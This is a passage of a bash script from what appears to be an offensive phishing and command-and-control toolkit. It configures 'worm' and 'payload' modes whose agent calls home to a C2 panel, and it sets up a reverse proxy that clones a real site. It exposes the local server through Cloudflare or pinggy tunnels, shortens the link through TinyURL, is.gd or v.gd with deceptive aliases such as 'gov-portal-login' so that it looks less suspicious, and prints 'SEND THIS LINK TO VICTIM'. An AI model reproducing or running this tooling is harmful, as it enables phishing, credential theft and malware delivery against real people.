    banner
    step 3 "CONFIGURE"
    echo ""

    # Worm and Payload modes — no target domain needed
    if [ "$DIRECTION" = "worm" ]; then
        MY_IP=$(ip route get 1 2>/dev/null | awk '{print $7; exit}')
        [ -z "$MY_IP" ] && MY_IP=$(hostname -I 2>/dev/null | awk '{print $1}')
        ok "My IP auto-detected: $MY_IP"
        info "File-based worm — no target domain needed"
        log "Config: worm mode, ip=$MY_IP"
        wait_key
        return
    fi

    if [ "$DIRECTION" = "payload" ]; then
        MY_IP=$(ip route get 1 2>/dev/null | awk '{print $7; exit}')
        [ -z "$MY_IP" ] && MY_IP=$(hostname -I 2>/dev/null | awk '{print $1}')
        ok "My IP auto-detected: $MY_IP"
        info "No target domain needed — agent calls home to your C2"
        info "C2 server will run on :8888 (web panel) — exposed via tunnel"
        log "Config: payload mode, ip=$MY_IP"
        wait_key
        return
    fi

    # Target domain
    [ -z "$TARGET_DOMAIN" ] && TARGET_DOMAIN=""
    info "Mirror target: ${W}$TARGET_DOMAIN${N}"
    info "(This is the real site the proxy clones — victim sees YOUR link, gets this site's content)"
    ask "Change mirror target? (Enter to keep '$TARGET_DOMAIN')"
    if [ -n "$REPLY" ]; then
        TARGET_DOMAIN="$REPLY"
        ok "Target set to: $TARGET_DOMAIN"
    else
        ok "Keeping: $TARGET_DOMAIN"
    fi

    # My IP — auto-detect, no prompt
    MY_IP=$(ip route get 1 2>/dev/null | awk '{print $7; exit}')
    [ -z "$MY_IP" ] && MY_IP=$(hostname -I 2>/dev/null | awk '{print $1}')
    ok "My IP auto-detected: $MY_IP"

    log "Config: target=$TARGET_DOMAIN ip=$MY_IP"
    wait_key
}

# ── Shared: open tunnel + mask URL ──────────────────────────
open_tunnel() {
    local PORT=$1
    banner
    step "4a" "OPENING TUNNEL"
    echo ""
    info "Using Cloudflare Tunnel — clean URL, valid cert, no warnings"
    echo ""

    # Kill any old tunnel
    kill $TUNNEL_PID 2>/dev/null
    pkill -f "cloudflared tunnel\|cloudflared.*http" 2>/dev/null
    sleep 1

    # Start cloudflared with clean config (bypass any system ingress rules)
    TUNNEL_LOG="/tmp/tunnel_$PORT.log"
    printf "protocol: quic\nedge-ip-version: auto\n" > /tmp/cf_quick.yml
    cloudflared tunnel --config /tmp/cf_quick.yml --url http://localhost:$PORT --no-autoupdate \
        > "$TUNNEL_LOG" 2>&1 &
    TUNNEL_PID=$!

    # Wait for URL (up to 20s)
    info "Waiting for tunnel..."
    for i in $(seq 1 20); do
        sleep 1
        RAW_URL=$(grep -o 'https://[a-z0-9-]*\.trycloudflare\.com' "$TUNNEL_LOG" 2>/dev/null | head -1)
        [ -n "$RAW_URL" ] && break
    done

    if [ -z "$RAW_URL" ]; then
        warn "Cloudflare tunnel failed — falling back to pinggy"
        warn "Run in your terminal:"
        echo -e "\n  ${W}ssh -o StrictHostKeyChecking=no -p 443 -R0:localhost:$PORT a.pinggy.io${N}\n"
        ask "Paste the pinggy URL here:"
        RAW_URL="$REPLY"
    else
        ok "Cloudflare URL: $RAW_URL"
    fi

    # Offer URL masking
    echo ""
    echo -e "  ${W}Mask this URL to look less suspicious?${N}"
    echo -e "  ${C}[1]${N} TinyURL  (tinyurl.com/xxxxx)"
    echo -e "  ${C}[2]${N} Custom text alias (tinyurl.com/your-text)"
    echo -e "  ${C}[3]${N} Keep as-is"
    echo -n "  > "
    read -r MASK_CHOICE

    shorten_url() {
        local url="$1" alias="$2" result=""
        # Always use direct connection (not Tor) — shorteners block Tor exits
        if [ -n "$alias" ]; then
            result=$(curl -s --max-time 10 --noproxy '*' \
                "https://tinyurl.com/api-create.php?url=$url&alias=$alias" 2>/dev/null)
            echo "$result" | grep -q "Error\|already\|invalid" && result=""
        fi
        # TinyURL auto
        [ -z "$result" ] && result=$(curl -s --max-time 10 --noproxy '*' \
            "https://tinyurl.com/api-create.php?url=$url" 2>/dev/null)
        # Fallback: is.gd
        if [ -z "$result" ] || echo "$result" | grep -qi "error"; then
            result=$(curl -s --max-time 10 --noproxy '*' \
                "https://is.gd/create.php?format=simple&url=$url" 2>/dev/null)
        fi
        # Fallback: v.gd
        if [ -z "$result" ] || echo "$result" | grep -qi "error"; then
            result=$(curl -s --max-time 10 --noproxy '*' \
                "https://v.gd/create.php?format=simple&url=$url" 2>/dev/null)
        fi
        echo "$result"
    }

    case "$MASK_CHOICE" in
        1)
            info "Shortening URL..."
            TUNNEL_URL=$(shorten_url "$RAW_URL")
            echo "$TUNNEL_URL" | grep -qi "error\|^$" && TUNNEL_URL="$RAW_URL" && \
                warn "Shortener failed — using raw URL" || ok "Masked: $TUNNEL_URL"
            ;;
        2)
            ask "Enter alias (e.g. gov-portal-login):"
            info "Shortening URL..."
            TUNNEL_URL=$(shorten_url "$RAW_URL" "$REPLY")
            echo "$TUNNEL_URL" | grep -qi "error\|^$" && TUNNEL_URL="$RAW_URL" && \
                warn "Alias taken or failed — using raw URL" || ok "Masked: $TUNNEL_URL"
            ;;
        *)
            TUNNEL_URL="$RAW_URL"
            ok "Using raw URL"
            ;;
    esac

    echo ""
    echo -e "  ${R}╔══════════════════════════════════════════════╗${N}"
    echo -e "  ${R}║  SEND THIS LINK TO VICTIM:                  ║${N}"
    echo -e "  ${R}║  $TUNNEL_URL${N}"
    echo -e "  ${R}╚══════════════════════════════════════════════╝${N}"
    echo ""
    log "Tunnel: $RAW_URL → masked: $TUNNEL_URL"
    wait_key
}

